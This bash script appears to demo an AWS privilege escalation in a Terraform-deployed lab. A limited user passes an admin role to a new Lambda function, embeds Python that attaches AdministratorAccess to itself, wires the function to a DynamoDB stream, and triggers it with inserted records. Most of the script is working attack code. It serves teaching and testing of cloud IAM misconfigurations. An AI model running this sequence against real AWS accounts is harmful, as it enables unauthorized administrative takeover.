#!/bin/bash

# Demo script for iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping (DynamoDB) privilege escalation
# This scenario demonstrates how a user with PassRole, CreateFunction, and CreateEventSourceMapping can escalate
# privileges by creating a Lambda function with a privileged role and linking it to a DynamoDB stream trigger


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-002-to-admin-starting-user"
TARGET_ROLE="pl-prod-lambda-002-to-admin-target-role"
LAMBDA_FUNCTION_NAME="pl-prod-lambda-002-malicious-lambda"
DYNAMODB_TABLE="pl-prod-lambda-002-to-admin-trigger-table"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + CreateEventSourceMapping (DynamoDB) Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_lambda_002_iam_passrole_lambda_createfunction_createeventsourcemapping_dynamodb.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get admin credentials for verification steps
ADMIN_ACCESS_KEY_ID=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY_ID" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve admin credentials from Terraform${NC}"
    echo -e "${YELLOW}Policy verification may not work properly${NC}"
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Get DynamoDB stream ARN
echo -e "${YELLOW}Step 5: Getting DynamoDB stream ARN${NC}"
echo "Describing DynamoDB table: $DYNAMODB_TABLE"

show_cmd "aws dynamodb describe-table --region $AWS_REGION --table-name $DYNAMODB_TABLE --query 'Table.LatestStreamArn' --output text"
DYNAMODB_STREAM_ARN=$(aws dynamodb describe-table \
    --region $AWS_REGION \
    --table-name $DYNAMODB_TABLE \
    --query 'Table.LatestStreamArn' \
    --output text)

if [ -z "$DYNAMODB_STREAM_ARN" ] || [ "$DYNAMODB_STREAM_ARN" == "None" ]; then
    echo -e "${RED}Error: Could not retrieve DynamoDB stream ARN${NC}"
    exit 1
fi

echo "DynamoDB Stream ARN: $DYNAMODB_STREAM_ARN"
echo -e "${GREEN}✓ Retrieved DynamoDB stream ARN${NC}\n"

# Step 6: Prepare Lambda function payload
echo -e "${YELLOW}Step 6: Preparing Lambda function to grant admin access${NC}"
echo "Creating Python function that will attach AdministratorAccess to our user..."

# Create Lambda function code
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3
import os

def lambda_handler(event, context):
    """
    This Lambda function is triggered by DynamoDB stream events.
    It uses its privileged role to attach AdministratorAccess policy to the starting user.
    """
    iam = boto3.client('iam')

    # Extract the target user from the event or use environment variable
    target_user = os.environ.get('TARGET_USER', 'pl-prod-lambda-002-to-admin-starting-user')

    try:
        # Attach AdministratorAccess policy to the starting user
        response = iam.attach_user_policy(
            UserName=target_user,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': f'Successfully attached AdministratorAccess to {target_user}',
                'user': target_user
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(e),
                'message': 'Failed to attach policy'
            })
        }
EOF

# Create a zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"

# Step 7: Create Lambda function with target role
echo -e "${YELLOW}Step 7: Creating Lambda function with privileged role${NC}"
echo "This is the privilege escalation vector - passing the admin role to Lambda..."
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"

show_attack_cmd "aws lambda create-function --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --runtime \"python3.11\" --role \"$TARGET_ROLE_ARN\" --handler \"lambda_function.lambda_handler\" --zip-file \"fileb:///tmp/lambda_function.zip\" --timeout 30 --environment \"Variables={TARGET_USER=$STARTING_USER}\" --output json"
LAMBDA_RESULT=$(aws lambda create-function \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --runtime "python3.11" \
    --role "$TARGET_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb:///tmp/lambda_function.zip" \
    --timeout 30 \
    --environment "Variables={TARGET_USER=$STARTING_USER}" \
    --output json)

if [ $? -eq 0 ]; then
    FUNCTION_ARN=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionArn')
    echo "Function ARN: $FUNCTION_ARN"
    echo -e "${GREEN}✓ Successfully created Lambda function with privileged role!${NC}"
else
    echo -e "${RED}Error: Failed to create Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 8: Wait for Lambda function to be ready
echo -e "${YELLOW}Step 8: Waiting for Lambda function to be ready${NC}"
echo "Allowing time for Lambda function initialization..."
sleep 10
echo -e "${GREEN}✓ Lambda function ready${NC}\n"

# Step 9: Create event source mapping to link Lambda to DynamoDB stream
echo -e "${YELLOW}Step 9: Creating event source mapping to DynamoDB stream${NC}"
echo "Linking Lambda function to DynamoDB stream trigger..."
echo "Function: $LAMBDA_FUNCTION_NAME"
echo "Stream: $DYNAMODB_STREAM_ARN"

show_attack_cmd "aws lambda create-event-source-mapping --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --event-source-arn \"$DYNAMODB_STREAM_ARN\" --starting-position LATEST --output json"
EVENT_SOURCE_MAPPING=$(aws lambda create-event-source-mapping \
    --region $AWS_REGION \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --event-source-arn "$DYNAMODB_STREAM_ARN" \
    --starting-position LATEST \
    --output json)

if [ $? -eq 0 ]; then
    EVENT_SOURCE_UUID=$(echo "$EVENT_SOURCE_MAPPING" | jq -r '.UUID')
    echo "Event Source Mapping UUID: $EVENT_SOURCE_UUID"
    echo -e "${GREEN}✓ Successfully created event source mapping!${NC}"
else
    echo -e "${RED}Error: Failed to create event source mapping${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 10: Wait for event source mapping to become active
echo -e "${YELLOW}Step 10: Waiting for event source mapping to become active${NC}"
echo "Event source mappings need time to initialize and connect to the stream..."

# Wait up to 60 seconds for event source mapping to become active
MAX_WAIT=60
WAITED=0
ESM_STATE="Creating"

while [ "$ESM_STATE" != "Enabled" ] && [ $WAITED -lt $MAX_WAIT ]; do
    sleep 5
    WAITED=$((WAITED + 5))
    ESM_STATUS=$(aws lambda get-event-source-mapping --uuid "$EVENT_SOURCE_UUID" --region $AWS_REGION --output json 2>/dev/null)
    if [ $? -eq 0 ]; then
        ESM_STATE=$(echo "$ESM_STATUS" | jq -r '.State')
        echo "Event source mapping state: $ESM_STATE (waited ${WAITED}s)"

        if [ "$ESM_STATE" == "Enabled" ]; then
            echo -e "${GREEN}✓ Event source mapping is now active!${NC}"
            break
        fi
    else
        echo "Waiting for event source mapping to be queryable..."
    fi
done

if [ "$ESM_STATE" != "Enabled" ]; then
    echo -e "${YELLOW}⚠ Event source mapping may not be fully active yet (current state: $ESM_STATE)${NC}"
    echo "Proceeding anyway, but Lambda may not trigger immediately..."
fi
echo ""

# Step 11: Trigger Lambda by inserting DynamoDB records with retry logic
echo -e "${YELLOW}Step 11: Triggering Lambda function and waiting for privilege escalation${NC}"
echo "Note: Event source mappings take time to fully initialize even after showing 'Enabled'"
echo "We'll insert DynamoDB records every 10 seconds and check for policy attachment..."
echo ""

# Use admin credentials to check policy attachment
export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_ACCESS_KEY"
export AWS_REGION="$AWS_REGION"
unset AWS_SESSION_TOKEN

MAX_ATTEMPTS=30  # 30 attempts * 10 seconds = 5 minutes max
ATTEMPT=0
POLICY_ATTACHED=false

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))
    echo -e "${BLUE}Attempt $ATTEMPT/$MAX_ATTEMPTS: Inserting DynamoDB record...${NC}"

    # Switch to starting user credentials to insert record
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    export AWS_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN

    # Insert a new record
    aws dynamodb put-item \
        --region $AWS_REGION \
        --table-name "$DYNAMODB_TABLE" \
        --item '{
            "id": {"S": "test-trigger-'$(date +%s)'-attempt-'$ATTEMPT'"},
            "message": {"S": "Privilege escalation trigger attempt '$ATTEMPT'"}
        }' \
        --output json > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "  → Record inserted successfully"
    else
        echo -e "  ${YELLOW}→ Warning: Failed to insert record${NC}"
    fi

    # Wait a bit for Lambda to potentially execute
    sleep 5

    # Switch to admin credentials to check policy attachment
    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_ACCESS_KEY"
    export AWS_REGION="$AWS_REGION"
    unset AWS_SESSION_TOKEN

    # Check if AdministratorAccess was attached
    ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name "$STARTING_USER" --output json 2>/dev/null)

    if echo "$ATTACHED_POLICIES" | jq -e '.AttachedPolicies[] | select(.PolicyArn == "arn:aws:iam::aws:policy/AdministratorAccess")' > /dev/null 2>&1; then
        echo -e "${GREEN}  → SUCCESS! AdministratorAccess policy detected!${NC}"
        POLICY_ATTACHED=true
        break
    else
        echo "  → Policy not attached yet, waiting..."
        if [ $ATTEMPT -lt $MAX_ATTEMPTS ]; then
            sleep 5  # Additional wait before next attempt
        fi
    fi
done

if [ "$POLICY_ATTACHED" = false ]; then
    echo -e "\n${RED}✗ AdministratorAccess policy was NOT attached after $MAX_ATTEMPTS attempts${NC}"
    echo -e "${YELLOW}Lambda may not be executing. Possible issues:${NC}"
    echo "  1. Event source mapping may still be initializing"
    echo "  2. Lambda execution role may lack DynamoDB stream permissions"
    echo "  3. Lambda function may have errors"
    echo ""
    echo "Check Lambda logs with:"
    echo "  aws logs tail /aws/lambda/$LAMBDA_FUNCTION_NAME --follow --region $AWS_REGION"
    echo ""
    echo "Check event source mapping:"
    echo "  aws lambda get-event-source-mapping --uuid $EVENT_SOURCE_UUID --region $AWS_REGION"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi

echo -e "\n${GREEN}✓ Lambda executed and attached AdministratorAccess policy!${NC}"
echo "Took $ATTEMPT attempt(s) over approximately $((ATTEMPT * 10)) seconds"
echo ""

# Step 12: Wait for IAM policy propagation
echo -e "${YELLOW}Step 12: Waiting for IAM policy propagation${NC}"
echo "Allowing time for AdministratorAccess policy to propagate..."
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# Step 13: Verify administrator access with starting user credentials
echo -e "${YELLOW}Step 13: Verifying administrator access with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
export AWS_REGION="$AWS_REGION"
unset AWS_SESSION_TOKEN

echo "Attempting to list IAM users..."
show_cmd "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${YELLOW}⚠ Policy is attached but permissions may need more time to propagate${NC}"
    echo "Try running this command in a few seconds:"
    echo "  aws iam list-users"
fi
echo ""

# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created Lambda function with privileged role: $TARGET_ROLE"
echo "3. Created event source mapping linking Lambda to DynamoDB stream"
echo "4. Waited for event source mapping to fully initialize"
echo "5. Triggered Lambda by inserting records into DynamoDB table (took $ATTEMPT attempts)"
echo "6. Lambda executed with admin privileges and attached AdministratorAccess policy"
echo "7. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (PassRole + CreateFunction) → $LAMBDA_FUNCTION_NAME"
echo -e "  → (CreateEventSourceMapping) → DynamoDB stream trigger"
echo -e "  → Lambda executes with $TARGET_ROLE → (AttachUserPolicy) → Admin access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Lambda Function: $LAMBDA_FUNCTION_NAME"
echo "- Function Role: $TARGET_ROLE"
echo "- Event Source Mapping: Linked to DynamoDB stream"
echo "- DynamoDB Table: $DYNAMODB_TABLE (with test record)"
echo "- IAM Policy: AdministratorAccess attached to $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The Lambda function and event source mapping are still active${NC}"
echo -e "${RED}⚠ Lambda functions incur charges when invoked${NC}"
echo -e "${RED}⚠ The starting user now has AdministratorAccess attached${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
